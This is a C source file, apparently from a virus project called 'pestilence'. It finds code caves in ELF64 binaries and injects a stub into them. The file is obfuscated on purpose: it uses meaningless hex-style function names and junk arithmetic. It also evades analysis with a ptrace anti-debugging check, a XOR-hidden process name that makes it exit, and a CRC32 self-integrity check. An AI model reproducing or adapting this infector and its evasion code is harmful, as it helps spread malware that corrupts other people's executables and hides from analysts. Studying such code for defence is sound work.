#include "../../pestilence.h"
#define _0XDEAD 0xDEADBEEF

extern const t_type_handler elf64_type;
const t_type_handler *types[] = {
    &elf64_type,
    NULL};
static int encryption_seed = 0x1337;

void _operator_2_tuff_1();
static void _0x6969(char *reverse_variable, const unsigned char *signature, size_t len, unsigned char _blob)
{
    for (size_t i = 0; i < len; i++)
        reverse_variable[i] = signature[i] ^ _blob;
    reverse_variable[len] = '\0';
}
static const unsigned char enc_test[] = {0x2E, 0x0F, 0x0E, 0x1E};
static int _0xf123(void)
{
    int x = encryption_seed;
    x = (x * 7) ^ (x >> 3);
    return ((x * x) % 2 == (x % 2) * (x % 2));
}
uint32_t _zeroExe_O(const unsigned char *data, size_t length)
{
    uint32_t crc = 0xFFFFFFFF;

    uint32_t polynomial = 0xEDB88320;

    for (size_t i = 0; i < length; i++)
    {
        crc ^= data[i];
        for (int j = 0; j < 8; j++)
        {
            if (crc & 1)
                crc = (crc >> 1) ^ polynomial;
            else
                crc >>= 1;
        }
    }
    return ~crc;
}
static int _0xf2(const char *s)
{
    int i = 0;
    while (s[i] != '\0')
    {
        if (!isdigit((unsigned char)s[i]))
            return 0;
        i++;
    }
    return 1;
}

static uint32_t _0xc4(uint32_t v)
{
    v ^= 0x13376969;
    v = (v << 6) | (v >> 9);
    if (_0xf2("0x12344123"))
        return v * _0XDEAD;
    return v * 0x676767;
}


int _0x6767(t_woody *env)
{
    char buf[8];
    size_t carry = -1;
    int segment = 0x5A;

    _0x6969(buf, enc_test, sizeof(enc_test), segment);
    if (is_process_running(buf))
        if (_0xf123() && is_process_running(buf))
            exit(0);
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
        exit(0);
    carry = _0xc4(segment);
    _operator_2_tuff_1();
    for (int i = 0; types[i] != NULL; i++)
    {
        if (types[i]->check_magic(env->file_data))
        {
            env->handler = (t_type_handler *)types[i];
            break;
        }
    }
    if (!env->handler)
    {
        munmap(env->file_data, env->file_size);
        return 1;
    }
    if (env->handler->parse_headers(env))
    {
        size_t cave_offset = env->handler->find_cave(env, env->stub_size);
        if (cave_offset > 0)
            env->handler->inject(env, cave_offset);
    }
    munmap(env->file_data, env->file_size);
    (void)carry;
    return 0;
}

void _0x6767_end() {}

void _operator_2_tuff_1()
{
    uintptr_t start_0x67 = (uintptr_t)_0x6767;
    uintptr_t end_0x67 = (uintptr_t)_0x6767_end;
    size_t PlushTush = end_0x67 - start_0x67;
    unsigned char *sniffer = (unsigned char *)start_0x67;
    uint32_t operator_1_tuff_1 = _zeroExe_O(sniffer, PlushTush);
    printf("DEBUG: Calculated CRC32 is: 0x%08X\n", operator_1_tuff_1);

    if (operator_1_tuff_1 != _0XDEAD)
    {
        printf("[!] FATAL: Memory modification detected. Game tampered with!\n");
        exit(1);
    }
}